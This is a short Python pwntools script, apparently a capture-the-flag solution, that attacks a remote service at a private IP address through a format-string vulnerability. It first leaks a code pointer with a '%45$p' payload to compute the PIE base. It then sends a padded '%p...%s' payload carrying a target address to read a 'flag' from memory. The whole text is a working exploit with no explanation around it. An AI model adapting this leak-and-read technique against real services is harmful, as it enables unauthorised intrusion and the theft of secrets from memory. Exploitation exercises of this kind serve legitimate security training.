from pwn import *
r = remote('10.113.184.121', 10055)
payload = b'%45$p\n'
off = 0x11e9
r.send(payload)
text_leak = int(r.recvline().strip(), 16)
text_base = text_leak - off
flag_addr = text_base + 0x4040
payload = b'%p' * 0x17 + b'.' + b'%s'
payload = payload.ljust(0x80, b'\x00')
payload += p64(flag_addr)
r.send(payload)
r.recvuntil(b'.')
print(r.recvline())
r.close()